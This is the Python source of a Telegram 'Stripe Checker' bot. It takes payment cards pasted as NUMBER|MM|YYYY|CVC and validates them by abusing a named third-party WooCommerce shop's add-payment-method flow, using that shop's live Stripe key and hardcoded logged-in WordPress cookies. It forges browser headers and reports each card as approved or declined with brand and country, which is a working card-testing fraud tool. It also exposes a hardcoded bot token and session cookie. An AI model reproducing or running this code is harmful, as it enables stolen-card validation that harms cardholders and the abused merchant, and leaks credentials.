"""
Stripe Payment Method Checker - Telegram Bot
Designed for Render free tier hosting with webhook support
"""

import os
import requests
import uuid
import time
import json
import re
import asyncio
import threading
from typing import Optional, Dict, Any
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from flask import Flask, request

# ============== CONFIGURATION ==============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7950514269:AAElXX262n31xiSn1pCxthxhuMpjw9VjtVg")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")  # Your Render URL
PING_INTERVAL = 300  # Ping every 5 minutes (300 seconds)

# Site Configuration
SITE_URL = "https://infiniteautowerks.com"
PUBLISHABLE_KEY = "pk_live_51MwcfkEreweRX4nmunyHnVjt6qSmKUgaafB7msRfg4EsQrStC8l0FlevFiuf2vMpN7oV9B5PGmIc7uNv1tdnvnTv005ZJCfrCk"
COOKIES = """wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7C14873263ec0ace12b4c8926c1472fb012761f36b0d1dcfe2e7df480516bed7b5; wordpress_logged_in_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7Ced82f62145a463255c68d252f811c3baaa30f700a9a0ec76d330611126f019de"""
POSTAL_CODE = "10001"
COUNTRY = "US"

# Country code to name mapping
COUNTRY_MAP = {
    'TH': 'Thailand', 'BR': 'Brazil', 'US': 'United States', 'IN': 'India',
    'GB': 'United Kingdom', 'CA': 'Canada', 'AU': 'Australia', 'DE': 'Germany',
    'FR': 'France', 'IT': 'Italy', 'ES': 'Spain', 'MX': 'Mexico', 'JP': 'Japan',
    'CN': 'China', 'KR': 'South Korea', 'RU': 'Russia', 'NL': 'Netherlands',
    'PH': 'Philippines', 'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapore',
    'VN': 'Vietnam', 'PK': 'Pakistan', 'BD': 'Bangladesh', 'NG': 'Nigeria',
    'ZA': 'South Africa', 'EG': 'Egypt', 'TR': 'Turkey', 'PL': 'Poland',
    'UA': 'Ukraine', 'AR': 'Argentina', 'CO': 'Colombia', 'CL': 'Chile',
    'PE': 'Peru', 'VE': 'Venezuela', 'SA': 'Saudi Arabia', 'AE': 'UAE',
    'IL': 'Israel', 'SE': 'Sweden', 'NO': 'Norway', 'DK': 'Denmark',
    'FI': 'Finland', 'BE': 'Belgium', 'AT': 'Austria', 'CH': 'Switzerland',
    'PT': 'Portugal', 'GR': 'Greece', 'CZ': 'Czech Republic', 'RO': 'Romania',
    'HU': 'Hungary', 'IE': 'Ireland', 'NZ': 'New Zealand', 'HK': 'Hong Kong',
    'TW': 'Taiwan', 'KE': 'Kenya', 'GH': 'Ghana', 'MA': 'Morocco'
}


# ============== KEEP ALIVE SYSTEM ==============
def keep_alive():
    """Self-ping to keep Render free tier awake"""
    while True:
        time.sleep(PING_INTERVAL)
        if WEBHOOK_URL:
            try:
                response = requests.get(f"{WEBHOOK_URL}/ping", timeout=10)
                print(f"[Keep-Alive] Ping sent - Status: {response.status_code}")
            except Exception as e:
                print(f"[Keep-Alive] Ping failed: {e}")


def start_keep_alive():
    """Start the keep-alive thread"""
    if WEBHOOK_URL:
        thread = threading.Thread(target=keep_alive, daemon=True)
        thread.start()
        print("[Keep-Alive] Thread started")


class StripeWooCommerceAutomation:
    """Automates Stripe payment method creation and WooCommerce setup intent confirmation."""
    
    def __init__(self, site_url: str, cookies: str = None, publishable_key: str = None):
        self.site_url = site_url.rstrip('/')
        self.cookies = cookies
        self.publishable_key = publishable_key
        self.session = requests.Session()
        
        if cookies:
            self._set_cookies(cookies)
    
    def _set_cookies(self, cookie_string: str):
        for item in cookie_string.split('; '):
            if '=' in item:
                key, value = item.split('=', 1)
                self.session.cookies.set(key, value)
    
    def _generate_session_ids(self) -> Dict[str, str]:
        return {
            'guid': str(uuid.uuid4()).replace('-', '')[:32] + 'ca450',
            'muid': str(uuid.uuid4()).replace('-', '')[:32] + '531d',
            'sid': str(uuid.uuid4()).replace('-', '')[:32] + '05f1',
            'client_session_id': str(uuid.uuid4()),
            'elements_session_config_id': str(uuid.uuid4())
        }
    
    def fetch_ajax_nonce(self) -> Optional[str]:
        url = f"{self.site_url}/my-account/add-payment-method/"
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
        }
        
        try:
            response = self.session.get(url, headers=headers, timeout=30)
            
            patterns = [
                r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]+)"',
                r'_ajax_nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
                r'wc-stripe-[^"]*nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)
            
            return None
            
        except requests.exceptions.RequestException:
            return None
    
    def create_payment_method(
        self,
        card_number: str,
        exp_month: str,
        exp_year: str,
        cvc: str,
        postal_code: str,
        country: str = "US"
    ) -> Dict[str, Any]:
        
        url = "https://api.stripe.com/v1/payment_methods"
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
        }
        
        session_ids = self._generate_session_ids()
        formatted_card = card_number.replace(' ', '').replace('-', '')
        
        data = {
            'type': 'card',
            'card[number]': formatted_card,
            'card[cvc]': cvc,
            'card[exp_year]': exp_year,
            'card[exp_month]': exp_month,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': postal_code,
            'billing_details[address][country]': country,
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/066093a970; stripe-js-v3/066093a970; payment-element; deferred-intent',
            'referrer': self.site_url,
            'time_on_page': str(int(time.time() * 1000) % 100000),
            'client_attribution_metadata[client_session_id]': session_ids['client_session_id'],
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'guid': session_ids['guid'],
            'muid': session_ids['muid'],
            'sid': session_ids['sid'],
            'key': self.publishable_key,
            '_stripe_version': '2024-06-20'
        }
        
        try:
            response = requests.post(url, headers=headers, data=data, timeout=30)
            result = response.json()
            
            card_info = result.get('card', {})
            
            return {
                'success': response.status_code == 200 and 'id' in result,
                'status_code': response.status_code,
                'response': result,
                'payment_method_id': result.get('id'),
                'card_brand': card_info.get('brand', '').upper(),
                'card_funding': card_info.get('funding', '').upper(),
                'card_country': card_info.get('country'),
                'last4': card_info.get('last4')
            }
            
        except requests.exceptions.RequestException as e:
            return {
                'success': False,
                'error': str(e),
                'status_code': None,
                'response': None
            }
    
    def confirm_setup_intent(
        self,
        payment_method_id: str,
        ajax_nonce: str,
        payment_type: str = "card"
    ) -> Dict[str, Any]:
        
        url = f"{self.site_url}/wp-admin/admin-ajax.php"
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.site_url,
            'referer': f'{self.site_url}/my-account/add-payment-method/',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': payment_type,
            '_ajax_nonce': ajax_nonce
        }
        
        try:
            response = self.session.post(url, headers=headers, data=data, timeout=30)
            
            try:
                result = response.json()
            except json.JSONDecodeError:
                result = {'raw_response': response.text}
            
            success = False
            if response.status_code == 200:
                if isinstance(result.get('success'), bool):
                    success = result.get('success') == True
                elif result.get('data', {}).get('status') == 'succeeded':
                    success = True
            
            error_msg = None
            if not success:
                error_msg = result.get('data', {}).get('error', {}).get('message')
            
            return {
                'success': success,
                'status_code': response.status_code,
                'response': result,
                'error_message': error_msg
            }
            
        except requests.exceptions.RequestException as e:
            return {
                'success': False,
                'error': str(e),
                'status_code': None,
                'response': None
            }
    
    def add_payment_method(
        self,
        card_number: str,
        exp_month: str,
        exp_year: str,
        cvc: str,
        postal_code: str,
        country: str = "US",
        ajax_nonce: str = None
    ) -> Dict[str, Any]:
        
        result = {
            'step1_create_pm': None,
            'step2_confirm': None,
            'overall_success': False
        }
        
        # Step 1: Create Payment Method
        pm_result = self.create_payment_method(
            card_number=card_number,
            exp_month=exp_month,
            exp_year=exp_year,
            cvc=cvc,
            postal_code=postal_code,
            country=country
        )
        result['step1_create_pm'] = pm_result
        
        if not pm_result['success']:
            error_msg = pm_result.get('response', {}).get('error', {}).get('message', 'Unknown error')
            result['error_message'] = error_msg
            return result
        
        # Fetch nonce if not provided
        if not ajax_nonce:
            ajax_nonce = self.fetch_ajax_nonce()
            if not ajax_nonce:
                result['error_message'] = "Could not find AJAX nonce"
                return result
        
        # Step 2: Confirm Setup Intent
        confirm_result = self.confirm_setup_intent(
            payment_method_id=pm_result['payment_method_id'],
            ajax_nonce=ajax_nonce
        )
        result['step2_confirm'] = confirm_result
        
        if confirm_result['success']:
            result['overall_success'] = True
        else:
            error_msg = confirm_result.get('error_message') or 'Unknown error'
            result['error_message'] = error_msg
        
        return result


def parse_card_pipe(card_string: str) -> Dict[str, str]:
    """Parse card in pipe format: NUMBER|MM|YYYY|CVC"""
    parts = card_string.strip().split('|')
    if len(parts) != 4:
        raise ValueError(f"Invalid format. Use: NUMBER|MM|YYYY|CVC")
    
    number, month, year, cvc = parts
    
    if len(year) == 4:
        year = year[-2:]
    
    return {
        'number': number.strip(),
        'exp_month': month.strip().zfill(2),
        'exp_year': year.strip(),
        'cvc': cvc.strip()
    }


def format_card_info(brand: str, funding: str) -> str:
    brand = brand.upper() if brand else "UNKNOWN"
    funding = funding.upper() if funding else "UNKNOWN"
    return f"{brand} - {funding} - {funding} {brand}"


def check_card(card_string: str) -> str:
    """Check a card and return formatted result."""
    try:
        card = parse_card_pipe(card_string)
    except ValueError as e:
        return f"❌ Error: {e}"
    
    automation = StripeWooCommerceAutomation(
        site_url=SITE_URL,
        cookies=COOKIES,
        publishable_key=PUBLISHABLE_KEY
    )
    
    result = automation.add_payment_method(
        card_number=card['number'],
        exp_month=card['exp_month'],
        exp_year=card['exp_year'],
        cvc=card['cvc'],
        postal_code=POSTAL_CODE,
        country=COUNTRY
    )
    
    # Get card details
    pm_result = result.get('step1_create_pm', {})
    card_brand = pm_result.get('card_brand', 'UNKNOWN')
    card_funding = pm_result.get('card_funding', 'UNKNOWN')
    card_country_code = pm_result.get('card_country', '')
    card_country = COUNTRY_MAP.get(card_country_code, card_country_code)
    
    # Format year for output
    year_full = f"20{card['exp_year']}" if len(card['exp_year']) == 2 else card['exp_year']
    card_str = f"{card['number']}|{card['exp_month']}|{year_full}|{card['cvc']}"
    
    # Build output message
    if result['overall_success']:
        status = "🌠 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
    else:
        status = "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌"
    
    output = f"""
{status}

𝗖𝗮𝗿𝗱: {card_str}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth
𝐈𝐧𝐟𝐨: {format_card_info(card_brand, card_funding)}
𝐈𝐬𝐬𝐮𝐞𝐫: None
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {card_country} {card_country_code}
𝐎𝐰𝐧𝐞𝐫: @llegaccy
"""
    
    if not result['overall_success']:
        error_msg = result.get('error_message', 'Unknown error')
        output += f"𝐄𝐫𝐫𝐨𝐫: {error_msg}\n"
    
    return output


# ============== TELEGRAM BOT HANDLERS ==============

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    welcome_message = """
🔥 *Welcome to Stripe Checker Bot* 🔥

━━━━━━━━━━━━━━━━━━━━━━

🌟 *Premium Card Checker*
⚡ Fast & Reliable Stripe Auth
🔒 Secure Processing

━━━━━━━━━━━━━━━━━━━━━━

📌 Use /cmd to see available commands

👤 Owner: @llegaccy
    """
    await update.message.reply_text(welcome_message, parse_mode='Markdown')


async def cmd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cmd command - show available commands"""
    commands_message = """
📋 *Available Commands*

━━━━━━━━━━━━━━━━━━━━━━

/start - Welcome message
/cum <card> - Check a card
/cmd - Show this help

━━━━━━━━━━━━━━━━━━━━━━

📝 *Card Format:*
`/cum NUMBER|MM|YYYY|CVC`

📌 *Example:*
`/cum 4111111111111111|12|2025|123`

━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(commands_message, parse_mode='Markdown')


async def cum_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cum command - check a card"""
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide a card!\n\n"
            "📝 Format: `/cum NUMBER|MM|YYYY|CVC`\n"
            "📌 Example: `/cum 4111111111111111|12|2025|123`",
            parse_mode='Markdown'
        )
        return
    
    card_string = ' '.join(context.args)
    
    # Send processing message
    processing_msg = await update.message.reply_text("⏳ Checking card... Please wait!")
    
    # Check the card
    result = check_card(card_string)
    
    # Edit the message with result
    await processing_msg.edit_text(result)


# ============== FLASK APP FOR RENDER ==============

app = Flask(__name__)
application = None


@app.route('/')
def home():
    return "🤖 Stripe Checker Bot is running!"


@app.route('/ping')
def ping():
    """Keep-alive endpoint"""
    return "pong", 200


@app.route('/webhook', methods=['POST'])
def webhook():
    """Handle incoming Telegram updates via webhook"""
    global application
    if application:
        update = Update.de_json(request.get_json(force=True), application.bot)
        asyncio.run(application.process_update(update))
    return 'OK'


@app.route('/setwebhook')
def set_webhook():
    """Set the webhook URL"""
    if WEBHOOK_URL:
        webhook_url = f"{WEBHOOK_URL}/webhook"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
        response = requests.get(url)
        return response.json()
    return {"error": "WEBHOOK_URL not set"}


def setup_application():
    """Setup the Telegram application"""
    global application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("cmd", cmd_command))
    application.add_handler(CommandHandler("cum", cum_command))
    
    return application


# Initialize application on module load
setup_application()


if __name__ == "__main__":
    if WEBHOOK_URL:
        # Start keep-alive thread
        start_keep_alive()
        
        # For Render - Flask handles requests via gunicorn
        print(f"Starting in webhook mode...")
        print(f"Visit {WEBHOOK_URL}/setwebhook to configure the webhook")
        port = int(os.environ.get("PORT", 5000))
        app.run(host='0.0.0.0', port=port)
    else:
        # For local testing - use polling
        print("Starting in polling mode (local testing)...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
